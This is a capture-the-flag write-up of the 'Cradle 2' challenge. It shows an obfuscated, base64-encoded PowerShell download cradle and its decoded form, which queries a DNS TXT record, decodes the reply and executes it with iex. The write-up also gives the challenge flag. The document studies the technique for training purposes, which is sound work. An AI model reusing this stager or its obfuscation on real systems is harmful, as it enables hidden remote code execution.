# Cradle 2 

Seeing as the last download cradle was busted so easily, McSkiddy threw quite a few more obfuscation techniques into this one. He's sure of his work now.

Can you drill through to find the core behavior of this downloader?

```
poWeRShElL -nOp -EnC "JABhAD0AKAAxADIAMAAgACwANwAsACAAMwA3ACwAIAAxADEANwAsADEAOQAgACwAMQAxADQAIAAsACAAMgA1ACwAIAA1ADkALAAxADEANgAsACAANgAsADIANwApADsAJAByAD0AKAAoACAAWwBjAEgAQQBSAFsAXQBdACAAKAAkAGEAKQAgAHwARgBPAHIARQBBAGMAaAAgAHsAIABbAGMASABBAFIAXQAoACQAXwAtAGIAWABvAHIAIgAwAHgANAAxACIAIAApACAAfQAgACkAIAAtAEoATwBpAG4AJwAnACkAOwAkAHMAPQAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaABlAHMAKAAoACIAewAwAH0AewAxADIAfQB7ADQAfQB7ADEAMAB9AHsAMwB9AHsAMQB9AHsAOAB9AHsAMgB9AHsANwB9AHsANgB9AHsAMQAxAH0AewA1AH0AewA5AH0AIgAtAGYAIAAnAD0APQBRAGYAegAnACwAJAB7AHIAfQAsACcASABaAGgAOQBHACcALAAnAHkAJwAsACcAYwB2AE4AVwAnACwAJwBaADIAVgBHACcALAAnAGwAJwAsACcAYgA1AEYARwBjADcAUgAzAFkAJwAsACcAZgA1AFcAYQBmAE4AJwAsACcAYgAnACwAJwBaACcALAAnAFoAbQBaAGwAeABXACcALAAnAFIAbQAnACkALAAnAC4AJwAsACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiACAALQBmACcAUgBpAGcAaAB0AFQAJwAsACcAbwAnACwAJwBMAGUAZgB0ACcAKQApAHwARgBgAE8AcgBFAEEAYwBoACAAewAkAF8ALgB2AGEAbAB1AGUAfQApACAALQBqAG8AaQBuACAAJwAnACkAKQApADsAaQBgAGUAeAAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAKABOAFMAYABMAGAAbwBvAGsAVQBQACAALQBxAHUAZQByAHkAdAB5AHAAZQA9AHQAeAB0ACAAJABzACAAPgAkAG4AdQBsAGwAIAAyAD4AJgAxAHwAIABTAEUATABFAGMAVABgAC0AUwB0AGAAUgBpAGAATgBHACAALQBQAGEAdAB0AGUAcgBuACAAJwAiACoAIgAnACkAIAAtAHMAcABsAGkAdAAgACcAIgAnAFsAMABdACkAKQApACkA"
```

Intermediate 
250 points 

Similar to [cradle 1](cradle_1.md), lets first decode the base64 encoded string, we get:
```
$a=(120 ,7, 37, 117,19 ,114 , 25, 59,116, 6,27);$r=(( [cHAR[]] ($a) |FOrEAch { [cHAR]($_-bXor"0x41" ) } ) -JOin'');$s=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([regex]::Matches(("{0}{12}{4}{10}{3}{1}{8}{2}{7}{6}{11}{5}{9}"-f '==Qfz',${r},'HZh9G','y','cvNW','Z2VG','l','b5FGc7R3Y','f5WafN','b','Z','ZmZlxW','Rm'),'.',("{0}{1}{2}" -f'RightT','o','Left'))|F`OrEAch {$_.value}) -join '')));i`ex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((NS`L`ookUP -querytype=txt $s >$null 2>&1| SELEcT`-St`Ri`NG -Pattern '"*"') -split '"'[0]))))
```

seems pretty obfuscated, doing this manually would be a pain, there must a easier way right?
if you look closely, you can see that the command uses variables that start with $.

why do all the work when you can have powershell do it for you, lets run each individual command and see what the values are.

the iex command is 'invoke expression' which will execute the specified string as a command.We dont need to do that, we just need the values.You can read variables using the echo $<var name> command.

the answer was in the $s variable.
![reading the variables](Images/cradle_2.png)

`flag: leveleffect{payloads_in_dns_text_records}`

